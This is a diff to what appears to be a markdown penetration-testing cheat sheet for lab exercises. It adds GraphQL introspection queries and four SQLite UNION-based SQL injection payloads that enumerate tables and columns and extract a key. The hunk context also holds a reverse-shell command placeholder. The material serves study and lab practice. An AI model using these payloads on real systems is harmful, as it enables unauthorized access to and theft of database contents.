@@ -604,31 +604,75 @@ $ bash -c "<bash_rev_shell>"
         } 
         ```    
 
-- To get more details:
-    
-    ```javascript
-    query MyQuery {
-    __schema {
-        types {
-        name
-        fields {
-        name
-        } 
+    - To get more details:
         
+        ```javascript
+        query MyQuery {
+        __schema {
+            types {
+            name
+            fields {
+            name
+            } 
+            
+            }
         }
-    }
-    }
-    ```
+        }
+        ```
 
-- Using one of these queries, you should get a list of queries that you can run in place of the getprojects used by the application.
+    - Using one of these queries, you should get a list of queries that you can run in place of the getprojects used by the application.
 
-    ```javascript
-    query Query {
-    [NAME] {
-        id
-    }
-    }
-    ```
+        ```javascript
+        query Query {
+        [NAME] {
+            id
+        }
+        }
+        ```
+
+- Injection.
+    - Example for SQLite UNION method:
+
+```javascript
+// Identify columns
+query MyQuery {
+  project(id: "1 union SELECT 1,2,3--") {
+    id
+    name
+    description
+  }
+}
+
+
+// Get the databases
+query MyQuery {
+  project(id: "1 union SELECT 1,2,group_concat(tbl_name) FROM sqlite_master  WHERE type='table' and tbl_name NOT like 'sqlite_%'") {
+    id
+    name
+    description
+  }
+}
+
+
+// Get the columns
+query MyQuery {
+  project(id: "1 union SELECT 1,2,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='ptlabiikey'") {
+    id
+    name
+    description
+  }
+}
+
+
+// Get the key
+query MyQuery {
+  project(id: "1 union SELECT 1,2,value FROM ptlabiikey") {
+    id
+    name
+    description
+  }
+}
+```
 
 
 
